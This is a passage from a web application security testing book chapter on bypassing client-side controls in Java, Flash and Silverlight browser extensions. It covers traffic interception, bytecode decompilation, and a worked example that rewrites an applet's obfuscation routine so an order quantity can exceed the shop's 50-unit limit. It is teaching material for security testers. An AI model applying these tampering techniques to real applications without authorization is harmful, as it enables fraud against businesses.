goals, they have similar properties in their architecture that are relevant to 
security:
n They are compiled to an intermediate bytecode.
n They execute within a virtual machine that provides a sandbox environment for execution.
n They may use remoting frameworks employing serialization to transmit 
complex data structures or objects over HTTP.
Java
Java applets run in the Java Virtual Machine (JVM) and are subject to the sandboxing applied by the Java Security Policy. Because Java has existed since early 
in the web‚Äôs history, and because its core concepts have remained relatively 
unchanged, a large body of knowledge and tools are available for attacking and 
defending Java applets, as described later in this chapter.
Flash
Flash objects run in the Flash virtual machine, and, like Java applets, are sandboxed from the host computer. Once used largely as a method of delivering 
animated content, Flash has moved on. With newer versions of ActionScript, 
c05.indd 134 c05.indd 134 8/19/2011 12:05:42 PM 8/19/2011 12:05:42 PM
Stuttard c05.indd V3 - 07/22/2011 Page 135
 Chapter 5 n Bypassing Client-Side Controls 135
Flash is now squarely billed as capable of delivering full-blown desktop applications. A key recent change in Flash is ActionScript 3 and its remoting capability 
with Action Message Format (AMF) serialization.
Silverlight
Silverlight is Microsoft‚Äôs alternative to Flash. It is designed with the similar goal 
of enabling rich, desktop-like applications, allowing web applications to provide 
a scaled-down .NET experience within the browser, in a sandboxed environment. 
Technically, Silverlight applications can be developed in any .NET-compliant 
language from C# to Python, although C# is by far the most common.
Approaches to Browser Extensions
You need to employ two broad techniques when targeting applications that use 
browser extension components.
First, you can intercept and modify the requests made by the component 
and the responses received from the server. In many cases, this is the quickest 
and easiest way to start testing the component, but you may encounter several 
limitations. The data being transmitted may be obfuscated or encrypted, or may 
be serialized using schemes that are specifi c to the technology being used. By 
looking only at the traffi c generated by the component, you may overlook some 
key functionality or business logic that can be discovered only by analyzing 
the component itself. Furthermore, you may encounter obstacles to using your 
intercepting proxy in the normal way; however, normally these can be circumvented with some careful confi guration, as described later in this chapter.
Second, you can target the component itself directly and attempt to decompile its bytecode to view the original source, or interact dynamically with the 
component using a debugger. This approach has the advantage that, if done 
thoroughly, you identify all the functionality that the component supports or 
references. It also allows you to modify key data submitted in requests to the 
server, regardless of any obfuscation or encryption mechanisms used for data 
in transit. A disadvantage of this approach is that it can be time-consuming 
and may require detailed understanding of the technologies and programming 
languages used within the component.
In many cases, a combination of both these techniques is appropriate. The 
following sections look at each one in more detail.
Intercepting Traffi c from Browser Extensions
If your browser is already confi gured to use an intercepting proxy, and the 
application loads a client component using a browser extension, you may see 
requests from this component passing through your proxy. In some cases, you 
c05.indd 135 c05.indd 135 8/19/2011 12:05:42 PM 8/19/2011 12:05:42 PM
Stuttard c05.indd V3 - 07/22/2011 Page 136
136 Chapter 5 n Bypassing Client-Side Controls
don‚Äôt need to do anything more to begin testing the relevant functionality, 
because you can intercept and modify the component‚Äôs requests in the usual way.
In the context of bypassing client-side input validation that is implemented in 
a browser extension, if the component submits the validated data to the server 
transparently, this data can be modifi ed using an intercepting proxy in the same 
way as already described for HTML form data. For example, a browser extension supporting an authentication mechanism might capture user credentials, 
perform some validation on these, and submit the values to the server as plaintext parameters within the request. The validation can be circumvented easily 
without performing any analysis or attack on the component itself.
In other cases, you may encounter various obstacles that make your testing 
diffi cult, as described in the following sections.
Handling Serialized Data
Applications may serialize data or objects before transmitting them within HTTP 
requests. Although it may be possible to decipher some of the string-based data 
simply by inspecting the raw serialized data, in general you need to unpack the 
serialized data before it can be fully understood. And if you want to modify the 
data to interfere with the application‚Äôs processing, fi rst you need to unpack the 
serialized content, edit it as required, and reserialize it correctly. Simply editing the raw serialized data will almost certainly break the format and cause a 
parsing error when the application processes the message.
Each browser extension technology comes with its own scheme for serializing 
data within HTTP messages. In general, therefore, you can infer the serialization format based on the type of client component that is being employed, but 
the format usually is evident in any case from a close inspection of the relevant 
HTTP messages.
Java Serialization
The Java language contains native support for object serialization, and Java 
applets may use this to send serialized data structures between the client and 
server application components. Messages containing serialized Java objects 
usually can be identifi ed because they have the following Content-Type header:
Content-Type: application/x-java-serialized-object
Having intercepted the raw serialized data using your proxy, you can deserialize 
it using Java itself to gain access to the primitive data items it contains.
DSer is a handy plug-in to Burp Suite that provides a framework for viewing 
and manipulating serialized Java objects that have been intercepted within Burp. 
This tool converts the primitive data within the intercepted object into XML 
format for easy editing. When you have modifi ed the relevant data, DSer then 
reserializes the object and updates the HTTP request accordingly.
c05.indd 136 c05.indd 136 8/19/2011 12:05:42 PM 8/19/2011 12:05:42 PM
Stuttard c05.indd V3 - 07/22/2011 Page 137
 Chapter 5 n Bypassing Client-Side Controls 137
You can download DSer, and learn more about how it works, at the following URL:
http://blog.andlabs.org/2010/09/re-visiting-java-de-serialization-it.html
Flash Serialization
Flash uses its own serialization format that can be used to transmit complex 
data structures between server and client components. Action Message Format 
(AMF) normally can be identifi ed via the following Content-Type header:
Content-Type: application/x-amf
Burp natively supports AMF format. When it identifi es an HTTP request or 
response containing serialized AMF data, it unpacks the content and presents 
this in tree form for viewing and editing, as shown in Figure 5-5. When you have 
modifi ed the relevant primitive data items within the structure, Burp reserializes the message, and you can forward it to the server or client to be processed.
Figure 5-5: Burp Suite supports AMF format and lets you view and edit the 
deserialized data
c05.indd 137 c05.indd 137 8/19/2011 12:05:42 PM 8/19/2011 12:05:42 PM
Stuttard c05.indd V3 - 07/22/2011 Page 138
138 Chapter 5 n Bypassing Client-Side Controls
Silverlight Serialization
Silverlight applications can make use of the Windows Communication Foundation 
(WCF) remoting framework that is built in to the .NET platform. Silverlight client 
components using WCF typically employ Microsoft‚Äôs .NET Binary Format for 
SOAP (NBFS), which can be identifi ed via the following Content-Type header:
Content-Type: application/soap+msbin1
A plug-in is available for Burp Proxy that automatically deserializes NBFSencoded data before it is displayed in Burp‚Äôs interception window. After you 
have viewed or edited the decoded data, the plug-in re-encodes the data before 
it is forwarded to the server or client to be processed.
The WCF binary SOAP plug-in for Burp was produced by Brian Holyfi eld 
and is available to download here:
www.gdssecurity.com/l/b/2009/11/19/wcf-binary-soap-plug-in-for-burp/
Obstacles to Intercepting Traffi c from Browser Extensions
If you have set up your browser to use an intercepting proxy, you may fi nd that 
requests made by browser extension components are not being intercepted by 
your proxy, or are failing. This problem usually is due to issues with the component‚Äôs handling of HTTP proxies or SSL (or both). Typically it can be handled 
via some careful confi guration of your tools.
The fi rst problem is that the client component may not honor the proxy confi guration you have specifi ed in your browser or your computer‚Äôs settings. This 
is because components may issue their own HTTP requests, outside of the APIs 
provided by the browser itself or the extension framework. If this is happening, you can still intercept the component‚Äôs requests. You need to modify your 
computer‚Äôs hosts fi le to achieve the interception and confi gure your proxy to 
support invisible proxying and automatic redirection to the correct destination 
host. See Chapter 20 for more details on how to do this.
The second problem is that the client component may not accept the SSL 
certifi cate being presented by your intercepting proxy. If your proxy is using a 
generic self-signed certifi cate, and you have confi gured your browser to accept it, 
the browser extension component may reject the certifi cate nonetheless. This may 
be because the browser extension does not pick up the browser‚Äôs confi guration 
for temporarily trusted certifi cates, or it may be because the component itself 
programmatically requires that untrusted certifi cates should not be accepted. 
In either case, you can circumvent this problem by confi guring your proxy to 
use a master CA certifi cate, which is used to sign valid per-host certifi cates for 
each site you visit, and installing the CA certifi cate in your computer‚Äôs trusted 
certifi cate store. See Chapter 20 for more details on how to do this.
In some rare cases you may fi nd that client components are communicating 
using a protocol other than HTTP, which simply cannot be handled using an 
c05.indd 138 c05.indd 138 8/19/2011 12:05:43 PM 8/19/2011 12:05:43 PM
Stuttard c05.indd V3 - 07/22/2011 Page 139
 Chapter 5 n Bypassing Client-Side Controls 139
intercepting proxy. In these situations, you still may be able to view and modify 
the affected traffi c by using either a network sniffer or a function-hooking tool. 
One example is Echo Mirage, which can inject into a process and intercept calls 
to socket APIs, allowing you to view and modify data before it is sent over the 
network. Echo Mirage can be downloaded from the following URL:
www.bindshell.net/tools/echomirage
HACK STEPS
 1. Ensure that your proxy is correctly intercepting all traffic from the browser 
extension. If necessary, use a sniffer to identify any traffic that is not 
being proxied correctly.
 2. If the client component uses a standard serialization scheme, ensure that 
you have the tools necessary to unpack and modify it. If the component 
is using a proprietary encoding or encryption mechanism, you need to 
decompile or debug the component to fully test it.
 3. Review responses from the server that trigger key client-side logic. Often, 
timely interception and modification of a server response may allow you 
to ‚Äúunlock‚Äù the client GUI, making it easy to reveal and then perform 
complex or multistaged privileged actions.
 4. If the application performs any critical logic or events that the client component should not be trusted to perform (such as drawing a card or rolling 
dice in a gambling application), look for any correlation between execution of critical logic and communication with the server. If the client does 
not communicate with the server to determine the outcome of the event, 
the application is definitely vulnerable.
Decompiling Browser Extensions
By far the most thorough method of attacking a browser extension component 
is to decompile the object, perform a full review of the source code, and if necessary modify the code to change the object‚Äôs behavior, and recompile it. As 
already discussed, browser extensions are compiled into bytecode. Bytecode is a 
high-level platform-independent binary representation that can be executed by 
the relevant interpreter (such as the Java Virtual Machine or Flash Player), and 
each browser extension technology uses its own bytecode format. As a result, 
the application can run on any platform that the interpreter itself can run on.
The high-level nature of bytecode representation means that it is always 
theoretically possible to decompile the bytecode into something resembling the 
original source code. However, various defensive techniques can be deployed to 
cause the decompiler to fail, or to output decompiled code that is very diffi cult 
to follow and interpret.
c05.indd 139 c05.indd 139 8/19/2011 12:05:43 PM 8/19/2011 12:05:43 PM
Stuttard c05.indd V3 - 07/22/2011 Page 140
140 Chapter 5 n Bypassing Client-Side Controls
Subject to these obfuscation defenses, decompiling bytecode normally is the 
preferable route to understanding and attacking browser extension components. 
This allows you to review business logic, assess the full functionality of the 
client-side application, and modify its behavior in targeted ways.
Downloading the Bytecode
The fi rst step is to download the executable bytecode for you to start working 
on. In general, the bytecode is loaded in a single fi le from a URL specifi ed within 
the HTML source code for application pages that run the browser extension. 
Java applets generally are loaded using the <applet> tag, and other components 
generally are loaded using the <object> tag. For example:
<applet code=‚ÄùCheckQuantity.class‚Äù codebase=‚Äù/scripts‚Äù 
id=‚ÄùCheckQuantityApplet‚Äù>
</applet>
In some cases, the URL that loads the bytecode may be less immediately obvious, since the component may be loaded using various wrapper scripts provided 
by the different browser extension frameworks. Another way to identify the 
URL for the bytecode is to look in your proxy history after your browser has 
loaded the browser extension. If you take this approach, you need to be aware 
of two potential obstacles:
n Some proxy tools apply fi lters to the proxy history to hide from view items 
such as images and style sheet fi les that you generally are less interested 
in. If you cannot fi nd a request for the browser extension bytecode, you 
should modify the proxy history display fi lter so that all items are visible.
n Browsers usually cache the downloaded bytecode for extension components 
more aggressively than they do for other static resources such as images. 
If your browser has already loaded the bytecode for a component, even 
doing a full refresh for a page that uses the component may not cause 
the browser to request the component again. In this eventuality, you may 
need to fully clear your browser‚Äôs cache, shut down every instance of the 
browser, and then start a fresh browser session to force your browser to 
request the bytecode again.
When you have identifi ed the URL for the browser extension‚Äôs bytecode, usually you can just paste this URL into your browser‚Äôs address bar. Your browser 
then prompts you to save the bytecode fi le on your local fi lesystem.
TIP If you have identifi ed the request for the bytecode in your Burp Proxy 
history, and the server‚Äôs response contains the full bytecode (and not a reference to an earlier cached copy), you can save the bytecode directly to fi le 
c05.indd 140 c05.indd 140 8/19/2011 12:05:43 PM 8/19/2011 12:05:43 PM
Stuttard c05.indd V3 - 07/22/2011 Page 141
 Chapter 5 n Bypassing Client-Side Controls 141
from within Burp. The most reliable way to do this is to select the Headers tab 
within the response viewer, right-click the lower pane containing the response 
body, and select Copy to File from the context menu.
Decompiling the Bytecode
Bytecode usually is distributed in a single-fi le package, which may need to be 
unpacked to obtain the individual bytecode fi les for decompilation into source 
code.
Java applets normally are packaged as .jar (Java archive) fi les, and Silverlight 
objects are packaged as .xap fi les. Both of these fi le types use the zip archive 
format, so you can easily unpack them by renaming the fi les with the .zip
extension and then using any zip reader to unpack them into the individual fi les 
they contain. The Java bytecode is contained in .class fi les, and the Silverlight 
bytecode is contained in .dll fi les. After unpacking the relevant fi le package, 
you need to decompile these fi les to obtain source code.
Flash objects are packaged as .swf fi les and don‚Äôt require any unpacking 
before you use a decompiler.
To perform the actual bytecode decompilation, you need to use some specifi c 
tools, depending on the type of browser extension technology that is being used, 
as described in the following sections.
Java Tools
Java bytecode can be decompiled to into Java source code using a tool called 
Jad (the Java decompiler), which is available from:
www.varaneckas.com/jad
Flash Tools
Flash bytecode can be decompiled into ActionScript source code. An alternative 
approach, which is often more effective, is to disassemble the bytecode into a 
human-readable form, without actually fully decompiling it into source code. 
To decompile and disassemble Flash, you can use the following tools:
n Flasm ‚Äî www.nowrap.de/flasm
n Flare ‚Äî www.nowrap.de/flare
n SWFScan ‚Äî www.hp.com/go/swfscan (this works for Actionscript 2 and 3)
Silverlight Tools
Silverlight bytecode can be decompiled into source code using a tool called 
.NET Refl ector, which is available from:
www.red-gate.com/products/dotnet-development/reflector/
c05.indd 141 c05.indd 141 8/19/2011 12:05:43 PM 8/19/2011 12:05:43 PM
Stuttard c05.indd V3 - 07/22/2011 Page 142
142 Chapter 5 n Bypassing Client-Side Controls
Working on the Source Code
Having obtained the source code for the component, or something resembling 
it, you can take various approaches to attacking it. The fi rst step generally is 
to review the source code to understand how the component works and what 
functionality it contains or references. Here are some items to look for:
n Input validation or other security-relevant logic and events that occur 
on the client side
n Obfuscation or encryption routines being used to wrap user-supplied 
data before it is sent to the server
n ‚ÄúHidden‚Äù client-side functionality that is not visible in your user interface 
but that you might be able to unlock by modifying the component
n References to server-side functionality that you have not previously identifi ed via your application mapping
Often, reviewing the source code uncovers some interesting functions 
within the component that you want to modify or manipulate to identify 
potential security vulnerabilities. This may include removing client-side 
input validation, submitting nonstandard data to the server, manipulating 
client-side state or events, or directly invoking functionality that is present 
within the component.
You can modify the component‚Äôs behavior in several ways, as described in 
the following sections.
Recompiling and Executing Within the Browser
You can modify the decompiled source code to change the component‚Äôs behavior, recompile it to bytecode, and execute the modifi ed component within your 
browser. This approach is often preferred when you need to manipulate key 
client-side events, such as the rolling of dice in a gaming application.
To perform the recompilation, you need to use the developer tools that are 
relevant to the technology you are using:
n For Java, use the javac program in the JDK to recompile your modifi ed 
source code.
n For Flash, you can use flasm to reassemble your modifi ed bytecode or 
one of the Flash development studios from Adobe to recompile modifi ed 
ActionScript source code.
n For Silverlight, use Visual Studio to recompile your modifi ed source code.
Having recompiled your source code into one or more bytecode fi les, you 
may need to repackage the distributable fi le if required for the technology 
being used. For Java and Silverlight, replace the modifi ed bytecode fi les in your 
c05.indd 142 c05.indd 142 8/19/2011 12:05:43 PM 8/19/2011 12:05:43 PM
Stuttard c05.indd V3 - 07/22/2011 Page 143
 Chapter 5 n Bypassing Client-Side Controls 143
unpacked archive, repackage using a zip utility, and then change the extension 
back to .jar or .xap as appropriate.
The fi nal step is to load your modifi ed component into your browser so that 
your changes can take effect within the application you are testing. You can 
achieve this in various ways:
n If you can fi nd the physical fi le within your browser‚Äôs on-disk cache that 
contains the original executable, you can replace this with your modifi ed 
version and restart your browser. This approach may be diffi cult if your 
browser does not use a different individual fi le for each cached resource 
or if caching of browser extension components is implemented only in 
memory.
n Using your intercepting proxy, you can modify the source code of the 
page that loads the component and specify a different URL, pointing to 
either the local fi lesystem or a web server that you control. This approach 
normally is diffi cult because changing the domain from which the component is loaded may violate the browser‚Äôs same origin policy and 
may require reconfi guring your browser or other methods to weaken 
this policy.
n You can cause your browser to reload the component from the original 
server (as described in the earlier section ‚ÄúDownloading the Bytecode‚Äù), 
use your proxy to intercept the response containing the executable, and 
replace the body of the message with your modifi ed version. In Burp 
Proxy, you can use the Paste from File context menu option to achieve 
this. This approach usually is the easiest and least likely to run into the 
problems described previously.
Recompiling and Executing Outside the Browser
In some cases, it is not necessary to modify the component‚Äôs behavior while it 
is being executed. For example, some browser extension components validate 
user-supplied input and then obfuscate or encrypt the result before sending 
it to the server. In this situation, you may be able to modify the component to 
perform the required obfuscation or encryption on arbitrary unvalidated input 
and simply output the result locally. You can then use your proxy to intercept the 
relevant request when the original component submits the validated input, and 
you can replace this with the value that was output by your modifi ed component.
To carry out this attack, you need to change the original executable, which is 
designed to run within the relevant browser extension, into a standalone program that can be run on the command line. The way this is done depends on 
the programming language being used. For example, in Java you simply need 
to implement a main method. The section ‚ÄúJava Applets: A Worked Example‚Äù 
gives an example of how to do this.
c05.indd 143 c05.indd 143 8/19/2011 12:05:44 PM 8/19/2011 12:05:44 PM
Stuttard c05.indd V3 - 07/22/2011 Page 144
144 Chapter 5 n Bypassing Client-Side Controls
Manipulating the Original Component Using JavaScript
In some cases, it is not necessary to modify the component‚Äôs bytecode. Instead, 
you may be able to achieve your objectives by modifying the JavaScript within 
the HTML page that interacts with the component.
Having reviewed the component‚Äôs source code, you can identify all its public 
methods that can be invoked directly from JavaScript, and the way in which 
parameters to those methods are handled. Often, more methods are available 
than are ever called from within application pages, and you may also discover 
more about the purpose and handling of parameters to these methods.
For example, a component may expose a method that can be invoked to enable 
or disable parts of the visible user interface. Using your intercepting proxy, you 
may be able to edit the HTML page that loads the component and modify or 
add some JavaScript to unlock parts of the interface that are hidden.
HACK STEPS
 1. Use the techniques described to download the component‚Äôs bytecode, 
unpack it, and decompile it into source code.
 2. Review the relevant source code to understand what processing is being 
performed.
 3. If the component contains any public methods that can be manipulated to 
achieve your objective, intercept an HTML response that interacts with the 
component, and add some JavaScript to invoke the appropriate methods 
using your input.
 4. If not, modify the component‚Äôs source code to achieve your objective, and 
then recompile it and execute it, either in your browser or as a standalone 
program.
 5. If the component is being used to submit obfuscated or encrypted data to 
the server, use your modified version of the component to submit various 
suitably obfuscated attack strings to the server to probe for vulnerabilities, as you would for any other parameter.
Coping with Bytecode Obfuscation
Because of the ease with which bytecode can be decompiled to recover its 
source, various techniques have been developed to obfuscate the bytecode itself. 
Applying these techniques results in bytecode that is harder to decompile or that 
decompiles to misleading or invalid source code that may be very diffi cult to 
understand and impossible to recompile without substantial effort. For example, 
consider the following obfuscated Java source:
package myapp.interface;
import myapp.class.public;
import myapp.throw.throw;
c05.indd 144 c05.indd 144 8/19/2011 12:05:44 PM 8/19/2011 12:05:44 PM
Stuttard c05.indd V3 - 07/22/2011 Page 145
 Chapter 5 n Bypassing Client-Side Controls 145
import if.if.if.if.else;
import java.awt.event.KeyEvent;
public class double extends public implements strict
{
 public double(j j1)
 {
 _mthif();
 _fldif = j1;
 }
 private void _mthif(ActionEvent actionevent)
 {
 _mthif(((KeyEvent) (null)));
 switch(_fldif._mthnew()._fldif)
 {
 case 0:
 _fldfloat.setEnabled(false);
 _fldboolean.setEnabled(false);
 _fldinstanceof.setEnabled(false);
 _fldint.setEnabled(false);
 break;
...
The obfuscation techniques commonly employed are as follows:
n Meaningful class, method, and member variable names are replaced 
with meaningless expressions such as a, b, and c. This forces the reader 
of decompiled code to identify the purpose of each item by studying how 
it is used. This can make it diffi cult to keep track of different items while 
tracing them through the source code.
n Going further, some obfuscators replace item names with keywords 
reserved for the language, such as new and int. Although this technically 
renders the bytecode illegal, most virtual machines (VMs) tolerate the 
illegal code, and it executes normally. However, even if a decompiler 
can handle the illegal bytecode, the resulting source code is even less 
readable than that just described. More importantly, the source cannot 
be recompiled without extensive reworking to consistently rename 
illegally named items.
n Many obfuscators strip unnecessary debug and meta-information from 
the bytecode, including source fi lenames and line numbers (which makes 
stack traces less informative), local variable names (which frustrates debugging), and inner class information (which stops refl ection from working 
properly).
n Redundant code may be added that creates and manipulates various kinds 
of data in signifi cant-looking ways but that is autonomous from the real 
data actually being used by the application‚Äôs functionality.
c05.indd 145 c05.indd 145 8/19/2011 12:05:44 PM 8/19/2011 12:05:44 PM
Stuttard c05.indd V3 - 07/22/2011 Page 146
146 Chapter 5 n Bypassing Client-Side Controls
n The path of execution through code can be modifi ed in convoluted ways, 
through the use of jump instructions, so that the logical sequence of execution is hard to discern when reading through the decompiled source.
n Illegal programming constructs may be introduced, such as unreachable 
statements and code paths with missing return statements. Most VMs 
tolerate these phenomena in bytecode, but the decompiled source cannot 
be recompiled without correcting the illegal code.
HACK STEPS
Effective tactics for coping with bytecode obfuscation depend on the techniques used and the purpose for which you are analyzing the source. Here are 
some suggestions:
 1. You can review a component for public methods without fully understanding the source. It should be obvious which methods can be invoked 
from JavaScript, and what their signatures are, enabling you to test the 
behavior of the methods by passing in various inputs.
 2. If class, method, and member variable names have been replaced with 
meaningless expressions (but not special words reserved by the programming language), you can use the refactoring functionality built into 
many IDEs to help yourself understand the code. By studying how items 
are used, you can start to assign them meaningful names. If you use the 
rename tool within the IDE, it does a lot of work for you, tracing the item‚Äôs 
use throughout the codebase and renaming it everywhere.
 3. You can actually undo a lot of obfuscation by running the obfuscated bytecode through an obfuscator a second time and choosing suitable options. 
A useful obfuscator for Java is Jode. It can remove redundant code paths 
added by another obfuscator and facilitate the process of understanding 
obfuscated names by assigning globally unique names to items.
Java Applets: A Worked Example
We will now consider a brief example of decompiling browser extensions by 
looking at a shopping application that performs input validation within a Java 
applet.
In this example, the form that submits the user‚Äôs requested order quantity 
looks like this:
<form method=‚Äùpost‚Äù action=‚ÄùShop.aspx?prod=2‚Äù onsubmit=‚Äùreturn 
validateForm(this)‚Äù>
<input type=‚Äùhidden‚Äù name=‚Äùobfpad‚Äù 
value=‚ÄùklGSB8X9x0WFv9KGqilePdqaxHIsU5RnojwPdBRgZuiXSB3TgkupaFigj
UQm8CIP5HJxpidrPOuQPw63ogZ2vbyiOevPrkxFiuUxA8Gn30o1ep2Lax6IyuyEU
c05.indd 146 c05.indd 146 8/19/2011 12:05:44 PM 8/19/2011 12:05:44 PM
Stuttard c05.indd V3 - 07/22/2011 Page 147
 Chapter 5 n Bypassing Client-Side Controls 147
D9SmG7c‚Äù>
<script>
function validateForm(theForm)
{
 var obfquantity =
 document.CheckQuantityApplet.doCheck(
 theForm.quantity.value, theForm.obfpad.value);
 if (obfquantity == undefined)
 {
 alert(‚ÄòPlease enter a valid quantity.‚Äô);
 return false;
 }
 theForm.quantity.value = obfquantity;
 return true;
}
</script>
<applet code=‚ÄùCheckQuantity.class‚Äù codebase=‚Äù/scripts‚Äù width=‚Äù0‚Äù 
height=‚Äù0‚Äù
 id=‚ÄùCheckQuantityApplet‚Äù></applet>
Product: Samsung Multiverse <br/>
Price: 399 <br/>
Quantity: <input type=‚Äùtext‚Äù name=‚Äùquantity‚Äù> (Maximum quantity is 50) 
<br/>
<input type=‚Äùsubmit‚Äù value=‚ÄùBuy‚Äù>
</form>
When the form is submitted with a quantity of 2, the following request is made:
POST /shop/154/Shop.aspx?prod=2 HTTP/1.1
Host: mdsec.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
obfpad=klGSB8X9x0WFv9KGqilePdqaxHIsU5RnojwPdBRgZuiXSB3TgkupaFigjUQm8CIP5
HJxpidrPOuQ
Pw63ogZ2vbyiOevPrkxFiuUxA8Gn30o1ep2Lax6IyuyEUD9SmG7c&quantity=4b282c510f
776a405f465
877090058575f445b536545401e4268475e105b2d15055c5d5204161000
As you can see from the HTML code, when the form is submitted, the validation script passes the user‚Äôs supplied quantity, and the value of the obfpad
parameter, to a Java applet called CheckQuantity. The applet apparently performs 
the necessary input validation and returns to the script an obfuscated version 
of the quantity, which is then submitted to the server.
Since the server-side application confi rms our order for two units, it is clear 
that the quantity parameter somehow contains the value we have requested. 
However, if we try to modify this parameter without knowledge of the obfuscation algorithm, the attack fails, presumably because the server fails to unpack 
our obfuscated value correctly.
c05.indd 147 c05.indd 147 8/19/2011 12:05:44 PM 8/19/2011 12:05:44 PM
Stuttard c05.indd V3 - 07/22/2011 Page 148
148 Chapter 5 n Bypassing Client-Side Controls
In this situation, we can use the methodology already described to decompile 
the Java applet and understand how it functions. First, we need to download 
the bytecode for the applet from the URL specifi ed in the applet tag of the 
HTML page:
/scripts/CheckQuantity.class
Since the executable is not packaged as a .jar fi le, there is no need to unpack 
it, and we can run Jad directly on the downloaded .class fi le:
C:\tmp>jad CheckQuantity.class
Parsing CheckQuantity.class...The class file version is 50.0 (only 45.3, 
46.0 and 47.0 are supported)
 Generating CheckQuantity.jad
Couldn‚Äôt fully decompile method doCheck
Couldn‚Äôt resolve all exception handlers in method doCheck
Jad outputs the decompiled source code as a .jad fi le, which we can view in 
any text editor:
// Decompiled by Jad v1.5.8f. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.kpdus.com/jad.html
// Decompiler options: packimports(3)
// Source File Name: CheckQuantity.java
import java.applet.Applet;
public class CheckQuantity extends Applet
{
 public CheckQuantity()
 {
 }
 public String doCheck(String s, String s1)
 {
 int i = 0;
 i = Integer.parseInt(s);
 if(i <= 0 || i > 50)
 return null;
 break MISSING_BLOCK_LABEL_26;
 Exception exception;
 exception;
 return null;
 String s2 = (new StringBuilder()).append(‚Äúrand=‚Äù).append
(Math.random()).append(‚Äú&q=‚Äù).append(Integer.toString(i)).append
(‚Äú&checked=true‚Äù).toString();
 StringBuilder stringbuilder = new StringBuilder();
 for(int j = 0; j < s2.length(); j++)
 {
 String s3 = (new StringBuilder()).append(‚Äò0‚Äô).append
(Integer.toHexString((byte)s1.charAt((j * 19 + 7) % s1.length()) ^ 
s2.charAt(j))).toString();
c05.indd 148 c05.indd 148 8/19/2011 12:05:44 PM 8/19/2011 12:05:44 PM
Stuttard c05.indd V3 - 07/22/2011 Page 149
 Chapter 5 n Bypassing Client-Side Controls 149
 int k = s3.length();
 if(k > 2)
 s3 = s3.substring(k - 2, k);
 stringbuilder.append(s3);
 }
 return stringbuilder.toString();
 }
}
As you can see from the decompiled source, Jad has done a reasonable job of 
decompiling, and the source code for the applet is simple. When the doCheck
method is called with the user-supplied quantity and application-supplied 
obfpad parameters, the applet fi rst validates that the quantity is a valid number and is between 1 and 50. If so, it builds a string of name/value pairs using 
the URL querystring format, which includes the validated quantity. Finally, it 
obfuscates this string by performing XOR operations against characters with the 
obfpad string that the application supplied. This is a fairly easy and common 
way of adding some superfi cial obfuscation to data to prevent trivial tampering.
We have described various approaches you can take when you have decompiled and analyzed the source code for a browser extension component. In this 
case, the easiest way to subvert the applet is as follows:
 1. Modify the doCheck method to remove the input validation, allowing you 
to supply an arbitrary string as your quantity.
 2. Add a main method, allowing you to execute the modifi ed component 
from the command line. This method simply calls the modifi ed doCheck
method and prints the obfuscated result to the console.
When you have made these changes, the modifi ed source code is as follows:
public class CheckQuantity
{
 public static void main(String[] a)
 {
 System.out.println(doCheck(‚Äú999‚Äù, 
‚ÄúklGSB8X9x0WFv9KGqilePdqaxHIsU5RnojwPdBRgZuiXSB3TgkupaFigjUQm8CIP5HJxpi
drPOuQPw63ogZ2vbyiOevPrkxFiuUxA8Gn30o1ep2Lax6IyuyEUD9 SmG7c‚Äù));
 }
 public static String doCheck(String s, String s1)
 {
 String s2 = (new StringBuilder()).append(‚Äúrand=‚Äù).append
(Math.random()).append(‚Äú&q=‚Äù).append(s).append
(‚Äú&checked=true‚Äù).toString();
 StringBuilder stringbuilder = new StringBuilder();
 for(int j = 0; j < s2.length(); j++)
 {
 String s3 = (new StringBuilder()).append(‚Äò0‚Äô).append
c05.indd 149 c05.indd 149 8/19/2011 12:05:44 PM 8/19/2011 12:05:44 PM
Stuttard c05.indd V3 - 07/22/2011 Page 150
150 Chapter 5 n Bypassing Client-Side Controls
(Integer.toHexString((byte)s1.charAt((j * 19 + 7) % s1.length()) ^ 
s2.charAt(j))).toString();
 int k = s3.length();
 if(k > 2)
 s3 = s3.substring(k - 2, k);
 stringbuilder.append(s3);
 }
 return stringbuilder.toString();
 }
}
This version of the modifi ed component provides a valid obfuscated string 
for the arbitrary quantity of 999. Note that you could use nonnumeric input 
here, allowing you to probe the application for various kinds of input-based 
vulnerabilities.
TIP The Jad program saves its decompiled source code with the .jad extension. However, if you want to modify and recompile the source code, you need 
to rename each source fi le with the .java extension.
All that remains is to recompile the source code using the javac compiler 
that comes with the Java SDK, and then execute the component from the 
command line:
C:\tmp>javac CheckQuantity.java
C:\tmp>java CheckQuantity
4b282c510f776a455d425a7808015c555f42585460464d1e42684c414a152b1e0b5a520a
145911171609
Our modifi ed component has now performed the necessary obfuscation 
on our arbitrary quantity of 999. To deliver the attack to the server, we simply 
need to submit the order form in the normal way using valid input, intercept 
the resulting request using our proxy, and substitute the obfuscated quantity 
with the one provided by our modifi ed component. Note that if the application 
issues a new obfuscation pad each time the order form is loaded, you need to 
ensure that the obfuscation pad being submitted back to the server matches the 
one that was used to obfuscate the quantity also being submitted.
TRY IT!
These examples demonstrate the attack just described and the corresponding 
attacks using Silverlight and Flash technologies:
http://mdsec.net/shop/154/
http://mdsec.net/shop/167/
http://mdsec.net/shop/179/
c05.indd 150 c05.indd 150 8/19/2011 12:05:44 PM 8/19/2011 12:05:44 PM
Stuttard c05.indd V3 - 07/22/2011 Page 151
 Chapter 5 n Bypassing Client-Side Controls 151
Attaching a Debugger
Decompilation is the most complete method of understanding and compromising a browser extension. However, in large and complex components containing 
tens of thousands of lines of code, it is nearly always much quicker to observe the 
component during execution, correlating methods and classes with key actions 
within the interface. This approach also avoids diffi culties that may arise with 
interpreting and recompiling obfuscated bytecode. Often, achieving a specifi c 
objective is as simple as executing a key function and altering its behavior to 
circumvent the controls implemented within the component.
Because the debugger is working at the bytecode level, it can be easily used 
to control and understand the fl ow of execution. In particular, if source code 
can be obtained through decompilation, breakpoints can be set on specifi c 
lines of code, allowing the understanding gained through decompilation to be 
supported by practical observation of the code path taken during execution.
Although effi cient debuggers are not fully matured for all the browser extension technologies, debugging is well supported for Java applets. By far the best 
resource for this is JavaSnoop, a Java debugger that can integrate Jad to decompile source code, trace variables through an application, and set breakpoints on 
methods to view and modify parameters. Figure 5-6 shows JavaSnoop being 
used to hook directly into a Java applet running in the browser. Figure 5-7 
shows JavaSnoop being used to tamper with the return value from a method.
Figure 5-6: JavaSnoop can hook directly into an 
applet running in the browser
NOTE It‚Äôs best to run JavaSnoop before the target applet is loaded. 
JavaSnoop turns off the restrictions set by your Java security policy so that it 
can operate on the target. In Windows, it does this by granting all permissions 
to all Java programs on your system, so ensure that JavaSnoop shuts down 
